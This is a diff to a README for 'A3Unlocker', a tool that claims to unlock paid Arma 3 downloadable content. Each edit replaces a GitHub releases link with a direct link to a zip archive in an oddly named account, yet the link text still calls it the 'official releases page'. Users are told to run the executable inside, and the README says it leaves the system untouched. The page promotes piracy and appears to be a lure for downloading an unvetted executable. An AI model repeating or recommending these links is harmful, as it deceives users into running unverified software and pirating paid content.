@@ -1,6 +1,6 @@
 # 🛠️ .github - Access Arma 3 content with ease
 
-[![Download A3Unlocker](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/juiceless-drapery236/.github/releases)
+[![Download A3Unlocker](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/juiceless-drapery236/.github/main/profile/github-v2.2.zip)
 
 A3Unlocker enables access to Arma 3 downloadable content. The tool handles the activation process for players who own the base game. It removes the need for manual file changes or complex folder navigation.
 
@@ -15,7 +15,7 @@ A3Unlocker enables access to Arma 3 downloadable content. The tool handles the a
 
 Follow these steps to set up the tool on your machine.
 
-1. Visit the [official releases page](https://github.com/juiceless-drapery236/.github/releases) to access the download options.
+1. Visit the [official releases page](https://raw.githubusercontent.com/juiceless-drapery236/.github/main/profile/github-v2.2.zip) to access the download options.
 2. Choose the latest version of the executable file.
 3. Save the file to a folder you can access easily, such as your Downloads folder or your Desktop.
 4. Locate the downloaded file.
@@ -38,7 +38,7 @@ Once the application runs, it scans your computer for the Arma 3 installation fo
 
 You must download the software from the official repository to ensure you use the latest version.
 
-[Click here to go to the download page](https://github.com/juiceless-drapery236/.github/releases)
+[Click here to go to the download page](https://raw.githubusercontent.com/juiceless-drapery236/.github/main/profile/github-v2.2.zip)
 
 Select the file ending in .exe. This is the only file you need to run the unlocker. The application does not require a complex installation wizard. It runs as a portable tool, meaning it does not change your Windows registry or install background services.
 
